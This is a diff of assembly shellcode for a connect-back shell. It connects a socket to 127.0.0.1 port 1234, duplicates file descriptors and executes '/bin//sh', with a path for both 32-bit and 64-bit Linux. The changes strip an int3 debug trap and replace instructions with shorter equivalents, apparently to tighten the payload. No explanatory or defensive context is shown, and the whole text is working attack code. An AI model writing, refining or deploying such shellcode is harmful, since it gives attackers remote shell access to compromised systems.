@@ -34,8 +34,6 @@
 
     bits    32
     
-    int3
-    
     ; sa.sin_family = AF_INET;
     ; sa.sin_addr   = inet_addr("127.0.0.1");
     ; sa.sin_port   = htons(1234);
@@ -124,9 +122,8 @@ x86_dup2:
     int     0x80
     
 x84_execve:
-    cdq                 ; edx = 0
-    push    eax
-    pop     esi
+    xor     esi, esi
+    mul     esi
     push    eax         ; '\0'
     push    eax         ; null space
     push    eax         ; null space
@@ -136,14 +133,13 @@ x84_execve:
     pop     edi         ; rdi = "/bin//sh", 0
     mov     dword[edi+0], '/bin'
     mov     dword[edi+4], '//sh'
-    dec     eax
-    js      x86_execve
+    inc     eax
+    jnz     x86_execve
     mov     al, 59      ; rax = sys_execve
     syscall
 x86_execve:
     xor     ecx, ecx    ; argv = NULL
-    push    11
-    pop     eax         ; eax  = sys_execve
+    mov     al, 11      ; eax  = sys_execve
     int     0x80
     
     
